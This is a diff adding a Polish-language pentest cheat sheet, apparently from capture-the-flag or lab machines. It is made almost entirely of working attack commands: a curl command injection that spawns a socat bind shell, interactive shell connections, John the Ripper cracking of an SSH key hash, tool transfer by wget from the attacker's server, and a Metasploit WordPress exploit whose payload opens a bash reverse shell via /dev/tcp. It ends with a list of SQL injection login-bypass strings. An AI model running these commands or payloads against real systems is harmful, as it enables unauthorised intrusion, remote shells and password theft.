@@ -1,0 +1,50 @@
+find / -name user.txt 2>/dev/null
+
+
+DO uzyskania powłoki zdalnej ze strony http
+curl -G 'http://172.12.34.3/authorization.php' \
+  --data-urlencode 'x=socat TCP-LISTEN:11111,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane' \
+  -H 'Cookie: auth=protect'
+
+socat FILE:`tty`,raw,echo=0 TCP:172.12.34.3:11111
+
+
+do odhashowania hasla uzywajac john
+john --wordlist=/usr/share/wordlists/100k-most-used-passwords-NSC.txt id_rsa.john
+john --show id_rsa.john
+
+socat TCP-LISTEN:11111,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane - na maszynie
+socat FILE:`tty`,raw,echo=0 TCP:172.27.27.1:11111 - na kali
+
+komenda find do znalezienia user.txt/
+find / -name user.txt 2>/dev/null
+
+Przerzucenie nmapa po serwerze http
+python3 -m http.server 8000 - na kali
+wget http://10.65.0.6:8000/nmap-7.94SVN-x86_64-portable.tar.gz
+tar xzf nmap*
+
+puka w port przez co na chwile otwiera sie inny, nmap go wylapuje
+nc 10.43.21.105 17543 & sleep 1; ./nmap --datadir data -Pn -sT -p- 10.43.21.105
+
+
+MASZYNA RED
+nc -lvnp 9001 - na kali
+
+use exploit/multi/http/wp_crop_rce
+set RHOSTS 172.27.27.7
+set USERNAME demo
+set PASSWORD trywordpress
+set payload php/exec
+set CMD "setsid bash -c 'bash -i >& /dev/tcp/10.65.0.6/9001 0>&1' &"
+run
+
+#list sql injection
+' OR 1=1-- -
+' OR '1'='1
+' OR 1=1#
+admin'-- -
+admin'#
+') OR ('1'='1
+") OR ("1"="1
+' OR '1'='1'-- -
